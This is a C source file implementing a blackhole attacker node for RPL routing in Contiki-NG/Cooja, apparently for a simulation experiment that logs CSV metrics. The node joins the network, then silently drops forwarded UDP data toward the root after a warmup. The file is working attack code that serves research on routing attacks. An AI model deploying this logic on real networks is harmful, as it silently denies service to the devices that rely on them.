/*
 * attacker.c
 * Blackhole attacker for Contiki-NG / Cooja
 *
 * Behaviour:
 *   - Joins DODAG and participates in RPL routing normally
 *   - After ATTACK_WARMUP_SECONDS, drops all forwarded UDP data packets
 *     toward root
 *   - Control-plane packets (DIO/DAO/DIS) are always forwarded
 *
 * Attack starts at 350 s per experiment design (set ATTACK_WARMUP_SECONDS=350).
 *
 * CSV output:
 *   CSV,PROTOCOL,<id>,ATTACKER
 *   CSV,LLADDR,<id>,<hex>
 *   CSV,ATTACK_ENABLED,<id>
 *   CSV,FWD,<id>,<total>,<udp_to_root>,<dropped>
 *   CSV,PARENT,<id>,<ip|none>
 *   CSV,ROUTING,<id>,<joined>,<parent_ip>,<rank>
 */

#include "contiki.h"
#include "sys/log.h"
#include "net/netstack.h"
#include "net/ipv6/uip.h"
#include "net/ipv6/uipbuf.h"
#include "net/ipv6/uip-ds6.h"
#include "net/ipv6/uiplib.h"
#include "net/ipv6/simple-udp.h"
#include "net/routing/routing.h"
#include "net/routing/rpl-classic/rpl.h"
#include "net/routing/rpl-classic/rpl-private.h"
#include "random.h"

#include <stdint.h>
#include <stdio.h>
#include <string.h>

#define LOG_MODULE "ATTACKER"
#define LOG_LEVEL  LOG_LEVEL_WARN

#define UDP_PORT 8765

#ifndef WARMUP_SECONDS
#define WARMUP_SECONDS 60
#endif

#ifndef ATTACK_WARMUP_SECONDS
#define ATTACK_WARMUP_SECONDS 350
#endif

#ifndef ATTACK_DROP_PCT
#define ATTACK_DROP_PCT 100
#endif

#ifndef ROUTING_DIS_INT
#define ROUTING_DIS_INT (20 * CLOCK_SECOND)
#endif

/* ------------------------------------------------------------------ */
/* State                                                               */
/* ------------------------------------------------------------------ */
static uip_ipaddr_t root_ipaddr;
static uint8_t  attack_enabled;
static uint32_t fwd_total;
static uint32_t fwd_udp_root;
static uint32_t fwd_dropped;

/* ------------------------------------------------------------------ */
/* Helpers                                                             */
/* ------------------------------------------------------------------ */
static void
log_preferred_parent(void)
{
  rpl_dag_t *dag = rpl_get_any_dag();
  unsigned id = (unsigned)linkaddr_node_addr.u8[LINKADDR_SIZE - 1];
  if(dag == NULL || dag->preferred_parent == NULL) {
    printf("CSV,PARENT,%u,none\n", id);
    return;
  }
  const uip_ipaddr_t *paddr = rpl_parent_get_ipaddr(dag->preferred_parent);
  printf("CSV,PARENT,%u,", id);
  if(paddr != NULL) {
    uiplib_ipaddr_print(paddr);
  } else {
    printf("unknown");
  }
  printf("\n");
}

static void
log_routing_status(void)
{
  rpl_dag_t *dag = rpl_get_any_dag();
  unsigned id     = (unsigned)linkaddr_node_addr.u8[LINKADDR_SIZE - 1];
  unsigned joined = NETSTACK_ROUTING.node_has_joined() ? 1 : 0;
  printf("CSV,ROUTING,%u,%u,", id, joined);
  if(dag != NULL && dag->preferred_parent != NULL) {
    const uip_ipaddr_t *paddr = rpl_parent_get_ipaddr(dag->preferred_parent);
    if(paddr != NULL) {
      uiplib_ipaddr_print(paddr);
      printf(",%u\n", (unsigned)dag->rank);
      return;
    }
  }
  printf("none,0\n");
}

static uint8_t
should_drop(void)
{
  if(ATTACK_DROP_PCT == 0)   return 0;
  if(ATTACK_DROP_PCT >= 100) return 1;
  return (random_rand() % 100) < ATTACK_DROP_PCT;
}

static uint8_t
is_forwarded_udp_to_root(void)
{
  /* Ignore packets originated by us */
  if(uip_ds6_is_my_addr(&UIP_IP_BUF->srcipaddr)) {
    return 0;
  }
  uint8_t proto = 0;
  uipbuf_get_last_header(uip_buf, uip_len, &proto);
  if(proto != UIP_PROTO_UDP) {
    return 0;
  }
  if(UIP_UDP_BUF->destport != UIP_HTONS(UDP_PORT)) {
    return 0;
  }
  return uip_ipaddr_cmp(&UIP_IP_BUF->destipaddr, &root_ipaddr);
}

/* ------------------------------------------------------------------ */
/* IP output hook — blackhole drop                                     */
/* ------------------------------------------------------------------ */
static enum netstack_ip_action
ip_output_hook(const linkaddr_t *localdest)
{
  (void)localdest;

  if(!attack_enabled) {
    return NETSTACK_IP_PROCESS;
  }

  if(!uip_ds6_is_my_addr(&UIP_IP_BUF->srcipaddr)) {
    fwd_total++;
  }

  if(is_forwarded_udp_to_root() && should_drop()) {
    fwd_udp_root++;
    fwd_dropped++;
    return NETSTACK_IP_DROP;
  }

  if(is_forwarded_udp_to_root()) {
    fwd_udp_root++;
  }

  return NETSTACK_IP_PROCESS;
}

static struct netstack_ip_packet_processor pkt_proc = {
  .process_input  = NULL,
  .process_output = ip_output_hook
};

/* ------------------------------------------------------------------ */
/* Process                                                             */
/* ------------------------------------------------------------------ */
PROCESS(attacker_process, "Blackhole attacker");
AUTOSTART_PROCESSES(&attacker_process);

PROCESS_THREAD(attacker_process, ev, data)
{
  static struct etimer attack_timer;
  static struct etimer dis_timer;
  static struct etimer status_timer;

  (void)ev; (void)data;

  PROCESS_BEGIN();

  uip_ip6addr(&root_ipaddr, 0xaaaa, 0, 0, 0, 0, 0, 0, 1);
  attack_enabled = 0;
  fwd_total      = 0;
  fwd_udp_root   = 0;
  fwd_dropped    = 0;

  {
    unsigned id = (unsigned)linkaddr_node_addr.u8[LINKADDR_SIZE - 1];
    printf("CSV,PROTOCOL,%u,ATTACKER\n", id);
    printf("CSV,LLADDR,%u,", id);
    for(uint8_t i = 0; i < LINKADDR_SIZE; i++) {
      printf("%02x", linkaddr_node_addr.u8[i]);
      if(i + 1 < LINKADDR_SIZE) printf(":");
    }
    printf("\n");
    printf("CSV,ATTACK_PARAMS,%u,drop_pct=%u,warmup=%u\n",
           id, (unsigned)ATTACK_DROP_PCT, (unsigned)ATTACK_WARMUP_SECONDS);
  }

  netstack_ip_packet_processor_add(&pkt_proc);

  etimer_set(&attack_timer, (clock_time_t)(ATTACK_WARMUP_SECONDS * CLOCK_SECOND));
  etimer_set(&dis_timer,    30 * CLOCK_SECOND);
  etimer_set(&status_timer, 30 * CLOCK_SECOND);

  while(1) {
    PROCESS_WAIT_EVENT();

    /* Enable attack after warmup */
    if(!attack_enabled && etimer_expired(&attack_timer)) {
      attack_enabled = 1;
      printf("CSV,ATTACK_ENABLED,%u\n",
             (unsigned)linkaddr_node_addr.u8[LINKADDR_SIZE - 1]);
    }

    /* DIS keep-alive */
    if(etimer_expired(&dis_timer)) {
      if(!NETSTACK_ROUTING.node_has_joined()) {
        dis_output(NULL);
      }
      etimer_reset(&dis_timer);
    }

    /* Periodic stats */
    if(etimer_expired(&status_timer)) {
      unsigned id = (unsigned)linkaddr_node_addr.u8[LINKADDR_SIZE - 1];
      log_preferred_parent();
      log_routing_status();
      printf("CSV,FWD,%u,%lu,%lu,%lu\n",
             id,
             (unsigned long)fwd_total,
             (unsigned long)fwd_udp_root,
             (unsigned long)fwd_dropped);
      etimer_reset(&status_timer);
    }
  }

  PROCESS_END();
}
